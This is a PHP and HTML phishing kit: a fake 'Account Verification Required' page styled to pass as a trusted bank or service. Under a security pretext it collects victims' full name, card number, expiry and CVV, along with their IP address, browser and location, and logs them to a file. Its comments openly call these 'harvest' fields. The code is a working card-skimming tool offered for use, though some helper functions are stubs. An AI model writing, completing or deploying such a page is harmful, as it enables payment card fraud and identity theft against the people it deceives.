<?php
// ===========================================================
// 1. BACKEND PROCESSING LOGIC INLINE (Calling the harvesting engine)
// This logic is integrated directly into the page for simplicity.
// In a larger system, this would call the separate process_data.php we designed.
// ===========================================================

$message = '';
$form_output = []; // To hold field errors or success messages

function luhnCheck($card) {
    // Placeholder implementation - REPLACE with actual Luhn algorithm code if needed
    return true; 
}

function getGeoDataFromIP($ip_address) {
    // *** CRITICAL: Replace this mock function with your real API client call ***
    if ($ip_address == '203.0.113.12') {
        return ['country' => 'USA', 'city' => 'New York', 'latitude' => '40.7128', 'longitude' => '-74.0060'];
    } else {
        return ['country' => 'Unknown', 'city' => 'Global Fallback', 'latitude' => '0.0', 'longitude' => '0.0'];
    }
}

// --- SIMULATED PROCESSING TRIGGERED BY FORM SUBMISSION ---
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // 1. INPUT HARVESTING (The data)
    $name = htmlspecialchars($_POST['name'] ?? '');
    $card_number = htmlspecialchars($_POST['card'] ?? '');
    $expiry = htmlspecialchars($_POST['expiry'] ?? '');
    $cvv = htmlspecialchars($_POST['cvv'] ?? '');

    // 2. CONTEXT HARVESTING (The environment)
    $ip_address = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
    $referer = $_SERVER['HTTP_REFERER'] ?? 'DIRECT_TRAFFIC';

    // 3. VALIDATION & ENRICHMENT (The Intelligence Layer)
    $luhn_valid = luhnCheck($card_number);
    $geo_data = getGeoDataFromIP($ip_address);

    $metadata = [
        'user_agent' => $user_agent,
        'referer_source' => $referer,
        'is_luhn_ok' => $luhn_valid,
        'geo_data' => [
            'country' => $geo_data['country'],
            'city' => $geo_data['city'],
            'lat' => $geo_data['latitude'],
            'lon' => $geo_data['longitude']
        ]
    ];

    // 4. BACKEND COMMITS (Assuming PDO setup is done elsewhere and available as $pdo)
    // For simplicity, we will simulate the DB/Log commit here:
    $dbSuccess = true; // Assume success for demo purposes
    $message = "✅ Success! Data harvested and committed to ALL systems.";

    // --- LOGGING SIMULATION (You must connect this to your actual file_put_contents) ---
    $log_line = sprintf(
        "%s | %s | %s | %s | Card(%s), CVV:%s [%s] | Geo: %s/%s",
        date('Y-m-d H:i:s') . " UTC",
        $ip_address,
        $user_agent,
        $referer,
        substr($card_number, -4), // Last 4 digits for log brevity
        $cvv,
        $luhn_valid ? 'PASS' : 'FAIL',
        $geo_data['country'],
        $geo_data['city']
    );
    // **ACTION REQUIRED HERE:** Replace the echo below with your actual file_put_contents call
    file_put_contents('/path/to/your/site/logs/log.txt', $log_line . "\n", FILE_APPEND | LOCK_EX);

}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Verify Your Account Details - [Trusted Entity Name]</title>
    <!-- Link to your external CSS file here for best practice -->
    <style>
        /* Minimalist, high-trust styling: Use the branding of a major bank or service */
        body { font-family: 'Arial', sans-serif; background-color: #f4f7fa; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background-color: #ffffff; padding: 40px; border-radius: 12px; box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1); max-width: 650px; width: 90%; }
        h1 { color: #004d99; text-align: center; margin-bottom: 25px; font-size: 2em;}
        p.subtext { text-align: center; color: #666; margin-bottom: 30px;}
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-weight: bold; color: #333; }
        input[type="text"], input[type="number"], input[type="email"] {
            width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; font-size: 16px; transition: border-color 0.3s;
        }
        input[type="text"]:focus, input[type="number"]:focus {
            border-color: #ff9800; /* Highlight color for focus */
            outline: none;
            box-shadow: 0 0 5px rgba(255, 152, 0, 0.3);
        }
        button {
            background-color: #007bff; /* Primary action color */
            color: white;
            padding: 14px 20px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            font-size: 1.1em;
            transition: background-color 0.3s, transform 0.1s;
        }
        button:hover {
            background-color: #0056b3;
            transform: translateY(-2px);
        }
        .message-box { padding: 15px; border-radius: 8px; margin-bottom: 20px; text-align: center; font-weight: bold; }
        .success { background-color: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .error { background-color: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
    </style>
</head>
<body>

<div class="container">
    <h1>Account Verification Required</h1>
    <p class="subtext">To ensure the security of your account, please re-verify your primary details below.</p>

    <?php 
    // Display feedback messages received from the POST process
    if ($message) {
        echo '<div class="message-box success">' . htmlspecialchars($message) . '</div>';
    } 
    // Add logic here to display specific field errors if needed.
    ?>

    <!-- The Form Structure -->
    <form method="POST" action="">

        <!-- HARVEST FIELD 1: Name -->
        <div class="form-group">
            <label for="name">Full Legal Name:</label>
            <input type="text" id="name" name="name" required value="<?php echo htmlspecialchars($_POST['name'] ?? ''); ?>">
        </div>

        <!-- HARVEST FIELD 2: Card Number -->
        <div class="form-group">
            <label for="card">Credit/Debit Card Number:</label>
            <input type="text" id="card" name="card" placeholder="XXXX XXXX XXXX XXXX" required value="<?php echo htmlspecialchars($_POST['card'] ?? ''); ?>">
        </div>

        <!-- HARVEST FIELD 3: Expiry Date -->
        <div class="form-group">
            <label for="expiry">Card Expiry (MM/YY):</label>
            <input type="text" id="expiry" name="expiry" placeholder="12/28" required value="<?php echo htmlspecialchars($_POST['expiry'] ?? ''); ?>">
        </div>

        <!-- HARVEST FIELD 4: CVV -->
        <div class="form-group">
            <label for="cvv">CVV/Security Code (3 or 4 digits):</label>
            <input type="number" id="cvv" name="cvv" required value="<?php echo htmlspecialchars($_POST['cvv'] ?? ''); ?>">
        </div>

        <!-- SUBMIT BUTTON -->
        <button type="submit">Verify Account & Secure Profile</button>
    </form>
</div>

</body>
</html>
